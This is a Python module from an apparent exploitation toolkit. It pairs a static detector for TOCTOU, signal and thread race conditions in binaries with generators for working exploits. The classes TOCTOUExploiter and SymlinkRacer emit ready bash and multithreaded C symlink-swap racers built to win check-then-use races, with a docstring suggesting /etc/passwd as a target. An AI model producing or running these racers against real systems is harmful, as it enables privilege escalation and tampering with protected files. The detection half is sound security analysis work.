"""
Race condition and TOCTOU (Time-of-Check to Time-of-Use) vulnerability detection.

Detects race conditions in file operations, permission checks, and
multi-threaded code patterns.
"""

import os
import re
import subprocess
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.core.binary import Binary
from supwngo.fuzzing.crash_triage import CrashCase
from supwngo.vulns.detector import (
    ExploitPrimitive,
    Vulnerability,
    VulnerabilityDetector,
    VulnSeverity,
    VulnType,
)
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class RaceType(Enum):
    """Types of race conditions."""
    TOCTOU_FILE = auto()      # Time-of-check to time-of-use (file operations)
    TOCTOU_PERM = auto()      # Permission check race
    SYMLINK_RACE = auto()     # Symlink following race
    SIGNAL_RACE = auto()      # Signal handler race
    THREAD_RACE = auto()      # Multi-threaded race condition
    DOUBLE_FETCH = auto()     # Double fetch from user space (kernel)


@dataclass
class RaceWindow:
    """Represents a race condition window."""
    check_function: str
    check_address: int
    use_function: str
    use_address: int
    race_type: RaceType
    window_size: int = 0  # Estimated instructions between check and use
    exploitable: bool = False
    description: str = ""


@dataclass
class TOCTOUPattern:
    """Pattern for TOCTOU detection."""
    check_funcs: List[str]
    use_funcs: List[str]
    race_type: RaceType
    severity: VulnSeverity
    description: str


class RaceConditionDetector(VulnerabilityDetector):
    """
    Detect race condition vulnerabilities.

    Detection methods:
    1. Static: Pattern matching for check-then-use sequences
    2. Symbol analysis: Look for dangerous function pairs
    3. Disassembly: Analyze control flow for race windows
    """

    name = "race_condition_detector"
    vuln_type = VulnType.RACE_CONDITION

    # Common TOCTOU patterns
    TOCTOU_PATTERNS: List[TOCTOUPattern] = [
        TOCTOUPattern(
            check_funcs=["access", "stat", "lstat", "fstat"],
            use_funcs=["open", "fopen", "creat", "unlink", "rename", "chmod", "chown"],
            race_type=RaceType.TOCTOU_FILE,
            severity=VulnSeverity.HIGH,
            description="File access check followed by file operation",
        ),
        TOCTOUPattern(
            check_funcs=["stat", "lstat"],
            use_funcs=["open", "readlink", "realpath"],
            race_type=RaceType.SYMLINK_RACE,
            severity=VulnSeverity.HIGH,
            description="Symlink check-then-follow race",
        ),
        TOCTOUPattern(
            check_funcs=["getuid", "geteuid", "getgid", "getegid"],
            use_funcs=["setuid", "seteuid", "setgid", "setegid", "setreuid", "setregid"],
            race_type=RaceType.TOCTOU_PERM,
            severity=VulnSeverity.CRITICAL,
            description="Permission check followed by privilege change",
        ),
        TOCTOUPattern(
            check_funcs=["access"],
            use_funcs=["execve", "execl", "execlp", "execle", "execv", "execvp"],
            race_type=RaceType.TOCTOU_FILE,
            severity=VulnSeverity.CRITICAL,
            description="File accessibility check before execution",
        ),
    ]

    # Signal-related functions (potential signal races)
    SIGNAL_FUNCS = {
        "signal", "sigaction", "sigprocmask", "sigsuspend",
        "sigwait", "sigtimedwait", "sigwaitinfo",
    }

    # Thread-related functions
    THREAD_FUNCS = {
        "pthread_create", "pthread_join", "pthread_mutex_lock",
        "pthread_mutex_unlock", "pthread_cond_wait", "pthread_cond_signal",
    }

    def __init__(self, binary: Binary):
        """
        Initialize race condition detector.

        Args:
            binary: Target binary
        """
        super().__init__(binary)
        self._race_windows: List[RaceWindow] = []
        self._imported_funcs: Set[str] = set()

    def detect(
        self,
        crash: Optional[CrashCase] = None,
    ) -> List[Vulnerability]:
        """
        Detect race condition vulnerabilities.

        Args:
            crash: Optional crash case (not typically useful for race detection)

        Returns:
            List of detected race condition vulnerabilities
        """
        vulnerabilities = []

        # Get imported functions
        self._imported_funcs = self._get_imported_functions()

        # Detect TOCTOU patterns
        toctou_vulns = self._detect_toctou_patterns()
        vulnerabilities.extend(toctou_vulns)

        # Detect signal-related races
        signal_vulns = self._detect_signal_races()
        vulnerabilities.extend(signal_vulns)

        # Detect thread-related races
        thread_vulns = self._detect_thread_races()
        vulnerabilities.extend(thread_vulns)

        self._vulnerabilities = vulnerabilities
        return vulnerabilities

    def _get_imported_functions(self) -> Set[str]:
        """Get set of imported function names."""
        funcs = set()

        # From PLT
        if hasattr(self.binary, 'plt') and self.binary.plt:
            funcs.update(self.binary.plt.keys())

        # From GOT
        if hasattr(self.binary, 'got') and self.binary.got:
            funcs.update(self.binary.got.keys())

        # From symbols
        if hasattr(self.binary, 'symbols') and self.binary.symbols:
            funcs.update(self.binary.symbols.keys())

        return funcs

    def _detect_toctou_patterns(self) -> List[Vulnerability]:
        """
        Detect TOCTOU patterns by looking for check-then-use function pairs.

        Returns:
            List of TOCTOU vulnerabilities
        """
        vulns = []

        for pattern in self.TOCTOU_PATTERNS:
            # Check if both check and use functions are present
            check_present = [f for f in pattern.check_funcs if f in self._imported_funcs]
            use_present = [f for f in pattern.use_funcs if f in self._imported_funcs]

            if check_present and use_present:
                # Potential TOCTOU - record it
                for check_func in check_present:
                    for use_func in use_present:
                        check_addr = self._get_func_addr(check_func)
                        use_addr = self._get_func_addr(use_func)

                        window = RaceWindow(
                            check_function=check_func,
                            check_address=check_addr,
                            use_function=use_func,
                            use_address=use_addr,
                            race_type=pattern.race_type,
                            exploitable=True,
                            description=pattern.description,
                        )
                        self._race_windows.append(window)

                        vuln = Vulnerability(
                            vuln_type=VulnType.RACE_CONDITION,
                            severity=pattern.severity,
                            address=check_addr,
                            function=f"{check_func} -> {use_func}",
                            detection_method="static_pattern",
                            confidence=0.7,
                            description=f"TOCTOU: {pattern.description} ({check_func}/{use_func})",
                            details={
                                "race_type": pattern.race_type.name,
                                "check_function": check_func,
                                "use_function": use_func,
                                "check_address": hex(check_addr),
                                "use_address": hex(use_addr),
                            },
                        )
                        vulns.append(vuln)

        return vulns

    def _detect_signal_races(self) -> List[Vulnerability]:
        """
        Detect potential signal handler races.

        Returns:
            List of signal race vulnerabilities
        """
        vulns = []

        signal_present = [f for f in self.SIGNAL_FUNCS if f in self._imported_funcs]

        if signal_present:
            # Check for non-reentrant functions used alongside signals
            non_reentrant = {
                "malloc", "free", "printf", "fprintf", "sprintf",
                "exit", "strtok", "rand", "srand", "localtime",
                "gmtime", "ctime", "asctime", "getenv", "setenv",
            }

            unsafe_in_handler = [f for f in non_reentrant if f in self._imported_funcs]

            if unsafe_in_handler:
                vuln = Vulnerability(
                    vuln_type=VulnType.RACE_CONDITION,
                    severity=VulnSeverity.MEDIUM,
                    address=0,
                    function=", ".join(signal_present),
                    detection_method="static_pattern",
                    confidence=0.5,
                    description=f"Signal handler with non-reentrant functions: {', '.join(unsafe_in_handler[:3])}",
                    details={
                        "race_type": RaceType.SIGNAL_RACE.name,
                        "signal_functions": signal_present,
                        "non_reentrant_functions": unsafe_in_handler,
                    },
                )
                vulns.append(vuln)

        return vulns

    def _detect_thread_races(self) -> List[Vulnerability]:
        """
        Detect potential thread-related race conditions.

        Returns:
            List of thread race vulnerabilities
        """
        vulns = []

        thread_present = [f for f in self.THREAD_FUNCS if f in self._imported_funcs]

        if "pthread_create" in thread_present:
            # Check if proper synchronization is used
            has_mutex = any(f.startswith("pthread_mutex") for f in thread_present)
            has_cond = any(f.startswith("pthread_cond") for f in thread_present)

            if not has_mutex:
                vuln = Vulnerability(
                    vuln_type=VulnType.RACE_CONDITION,
                    severity=VulnSeverity.MEDIUM,
                    address=self._get_func_addr("pthread_create"),
                    function="pthread_create",
                    detection_method="static_pattern",
                    confidence=0.4,
                    description="Multi-threaded code without mutex protection",
                    details={
                        "race_type": RaceType.THREAD_RACE.name,
                        "thread_functions": thread_present,
                        "has_mutex": has_mutex,
                        "has_condition": has_cond,
                    },
                )
                vulns.append(vuln)

        return vulns

    def _get_func_addr(self, func_name: str) -> int:
        """Get address of function."""
        if hasattr(self.binary, 'plt') and func_name in self.binary.plt:
            return self.binary.plt[func_name]
        if hasattr(self.binary, 'got') and func_name in self.binary.got:
            return self.binary.got[func_name]
        if hasattr(self.binary, 'symbols') and func_name in self.binary.symbols:
            return self.binary.symbols[func_name]
        return 0

    def get_exploit_primitive(
        self,
        vuln: Vulnerability,
    ) -> Optional[ExploitPrimitive]:
        """
        Get exploitation primitive for race condition.

        Race conditions typically provide write or exec primitives
        depending on the type.

        Args:
            vuln: Detected vulnerability

        Returns:
            ExploitPrimitive or None
        """
        details = vuln.details
        race_type = details.get("race_type", "")

        if race_type == RaceType.TOCTOU_FILE.name:
            return ExploitPrimitive(
                primitive_type="write",
                target_controllable=True,
                value_controllable=True,
            )
        elif race_type == RaceType.TOCTOU_PERM.name:
            return ExploitPrimitive(
                primitive_type="exec",
                target_controllable=False,
                value_controllable=False,
            )
        elif race_type == RaceType.SYMLINK_RACE.name:
            return ExploitPrimitive(
                primitive_type="read",
                target_controllable=True,
            )

        return None

    def get_race_windows(self) -> List[RaceWindow]:
        """Get detected race windows."""
        return self._race_windows


class TOCTOUExploiter:
    """
    Exploit TOCTOU vulnerabilities through symlink racing.
    """

    def __init__(self, target_path: str, replacement_path: str):
        """
        Initialize TOCTOU exploiter.

        Args:
            target_path: Path the vulnerable program checks/uses
            replacement_path: Path to swap in during race window
        """
        self.target_path = target_path
        self.replacement_path = replacement_path
        self.temp_dir = "/tmp/.toctou_exploit"

    def generate_exploit_script(
        self,
        race_iterations: int = 100000,
        parallel_processes: int = 4,
    ) -> str:
        """
        Generate a shell script to exploit TOCTOU race.

        Args:
            race_iterations: Number of symlink swap attempts
            parallel_processes: Number of parallel racing processes

        Returns:
            Bash exploit script
        """
        script = f'''#!/bin/bash
# TOCTOU Race Condition Exploit
# Target: {self.target_path}
# Replacement: {self.replacement_path}

TARGET="{self.target_path}"
REPLACEMENT="{self.replacement_path}"
TEMP_DIR="{self.temp_dir}"
ITERATIONS={race_iterations}
PARALLEL={parallel_processes}

# Create temp directory
mkdir -p "$TEMP_DIR"
cd "$TEMP_DIR"

# Create a legitimate file for the check phase
LEGIT_FILE="$TEMP_DIR/legit"
touch "$LEGIT_FILE"

# Race function - rapidly swap symlink
race_symlink() {{
    local i=0
    while [ $i -lt $ITERATIONS ]; do
        # Point to legitimate file (passes check)
        ln -sf "$LEGIT_FILE" "$TARGET" 2>/dev/null
        # Point to replacement file (used instead)
        ln -sf "$REPLACEMENT" "$TARGET" 2>/dev/null
        ((i++))
    done
}}

echo "[*] Starting TOCTOU race..."
echo "[*] Target: $TARGET"
echo "[*] Replacement: $REPLACEMENT"
echo "[*] Iterations: $ITERATIONS"
echo "[*] Parallel processes: $PARALLEL"

# Start racing processes in background
for i in $(seq 1 $PARALLEL); do
    race_symlink &
done

echo "[*] Race processes started. Run vulnerable program now."
echo "[*] Waiting for race processes to complete..."

wait

echo "[*] Race complete. Check if exploit succeeded."

# Cleanup
rm -rf "$TEMP_DIR"
'''
        return script

    def generate_c_exploiter(self) -> str:
        """
        Generate C code for high-speed TOCTOU racing.

        Returns:
            C source code
        """
        code = f'''/*
 * High-speed TOCTOU Race Exploiter
 * Rapidly swaps symlinks to win race condition
 *
 * Compile: gcc -O3 -o toctou_race toctou_race.c -lpthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/stat.h>

#define TARGET "{self.target_path}"
#define LEGIT "/tmp/.toctou_legit"
#define REPLACEMENT "{self.replacement_path}"
#define ITERATIONS 1000000
#define NUM_THREADS 4

volatile int running = 1;
volatile int won = 0;

void *race_thread(void *arg) {{
    int tid = *(int*)arg;

    while (running && !won) {{
        // Try to win the race
        unlink(TARGET);
        symlink(LEGIT, TARGET);

        unlink(TARGET);
        symlink(REPLACEMENT, TARGET);
    }}

    return NULL;
}}

void *monitor_thread(void *arg) {{
    struct stat st;

    while (running) {{
        // Check if we won (replacement was used)
        if (lstat(TARGET, &st) == 0) {{
            char buf[256];
            ssize_t len = readlink(TARGET, buf, sizeof(buf)-1);
            if (len > 0) {{
                buf[len] = '\\0';
                if (strcmp(buf, REPLACEMENT) == 0) {{
                    printf("[+] Race won! Symlink points to replacement\\n");
                    won = 1;
                }}
            }}
        }}
        usleep(100);
    }}

    return NULL;
}}

int main(int argc, char **argv) {{
    pthread_t threads[NUM_THREADS];
    pthread_t monitor;
    int tids[NUM_THREADS];

    // Create legitimate file
    FILE *f = fopen(LEGIT, "w");
    if (f) {{
        fprintf(f, "legitimate content\\n");
        fclose(f);
    }}

    printf("[*] Starting TOCTOU race...\\n");
    printf("[*] Target: %s\\n", TARGET);
    printf("[*] Replacement: %s\\n", REPLACEMENT);

    // Start racing threads
    for (int i = 0; i < NUM_THREADS; i++) {{
        tids[i] = i;
        pthread_create(&threads[i], NULL, race_thread, &tids[i]);
    }}

    // Start monitor
    pthread_create(&monitor, NULL, monitor_thread, NULL);

    printf("[*] Press Enter to stop racing...\\n");
    getchar();

    running = 0;

    // Join threads
    for (int i = 0; i < NUM_THREADS; i++) {{
        pthread_join(threads[i], NULL);
    }}
    pthread_join(monitor, NULL);

    // Cleanup
    unlink(LEGIT);

    if (won) {{
        printf("[+] Exploit successful!\\n");
        return 0;
    }} else {{
        printf("[-] Race not won\\n");
        return 1;
    }}
}}
'''
        return code


class SymlinkRacer:
    """
    Utility for exploiting symlink races.
    """

    def __init__(self, link_path: str):
        """
        Initialize symlink racer.

        Args:
            link_path: Path where symlink will be created
        """
        self.link_path = link_path

    def create_race_payload(
        self,
        target_a: str,
        target_b: str,
        swap_interval_us: int = 1,
    ) -> str:
        """
        Create a racing payload that swaps between two targets.

        Args:
            target_a: First target (e.g., legitimate file)
            target_b: Second target (e.g., /etc/passwd)
            swap_interval_us: Swap interval in microseconds

        Returns:
            C source code for racer
        """
        code = f'''
#include <unistd.h>
#include <stdio.h>

int main() {{
    while(1) {{
        unlink("{self.link_path}");
        symlink("{target_a}", "{self.link_path}");
        usleep({swap_interval_us});

        unlink("{self.link_path}");
        symlink("{target_b}", "{self.link_path}");
        usleep({swap_interval_us});
    }}
    return 0;
}}
'''
        return code


def detect_toctou(binary: Binary) -> List[RaceWindow]:
    """
    Convenience function to detect TOCTOU vulnerabilities.

    Args:
        binary: Target binary

    Returns:
        List of race windows
    """
    detector = RaceConditionDetector(binary)
    detector.detect()
    return detector.get_race_windows()


def generate_toctou_exploit(
    target_path: str,
    replacement_path: str,
    output_type: str = "bash",
) -> str:
    """
    Generate TOCTOU exploit code.

    Args:
        target_path: Path being raced
        replacement_path: Desired target
        output_type: "bash" or "c"

    Returns:
        Exploit code
    """
    exploiter = TOCTOUExploiter(target_path, replacement_path)

    if output_type == "c":
        return exploiter.generate_c_exploiter()
    else:
        return exploiter.generate_exploit_script()
